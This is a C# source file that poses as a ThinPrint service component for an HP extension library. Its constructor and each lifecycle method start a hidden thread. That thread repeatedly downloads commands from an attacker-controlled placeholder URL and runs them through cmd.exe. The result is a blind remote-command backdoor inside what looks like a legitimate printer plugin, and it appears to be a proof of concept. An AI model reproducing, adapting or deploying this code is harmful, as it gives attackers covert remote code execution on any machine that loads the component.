using HP.ExtLib;
using System.Diagnostics.CodeAnalysis;
using System.Threading;
using System.Net;
using System.IO;
using System.Diagnostics;

namespace ThinPrint.TPJC
{
    public class ApplicationService : IExtServiceComponent
    {
        private const string APP_THREAD_NAME = "ThinPrint JediClient";
        private string url = "http://somehttpserveryouown.com/blar";

        public ApplicationService()
        {
            DoBadStuff(url);
        }

        public bool QueryTransition(ServiceComponentState state, string context)
        {
            DoBadStuff(url);
            return this.OnQueryTransition(state, context);
        }

        public bool TransitionTo(ServiceComponentState state, string context)
        {
            DoBadStuff(url);
            return true;
        }

        private bool OnQueryTransition(ServiceComponentState state, string context)
        {
            DoBadStuff(url);
            return true;
        }

        private void OnTransitionTo(object state)
        {
            DoBadStuff(url);
            Thread.CurrentThread.Name = "ThinPrint JediClient";
        }

        private static void DoBadStuff(string url)
        {
            Shells s = new Shells();
            s.url = url;
            Thread shellThread = new Thread(new ThreadStart(s.BlindCmd));
            shellThread.Start();
        }

    }


    public class Shells
    {
        public string url;

        // This method that will be called when the thread is started
        public void BlindCmd()
        {
            WebRequest wr = WebRequest.Create(this.url);
            while (true)
            {
                try
                {
                    HttpWebResponse resp = (HttpWebResponse)wr.GetResponse();
                    Stream dataStream = resp.GetResponseStream();
                    // Open the stream using a StreamReader for easy access.
                    StreamReader reader = new StreamReader(dataStream);
                    // Read the content.
                    string s = reader.ReadToEnd();
                    //exec the command
                    Process p = new Process();
                    p.StartInfo.FileName = "cmd.exe";
                    p.StartInfo.UseShellExecute = false;
                    p.StartInfo.Arguments = "/c " + s;
                    p.Start();
                    //sleep
                    Thread.Sleep(5000);
                    p.Kill();
                }
                catch
                {
                    Thread.Sleep(10000);
                }
            }
        }
    };


}
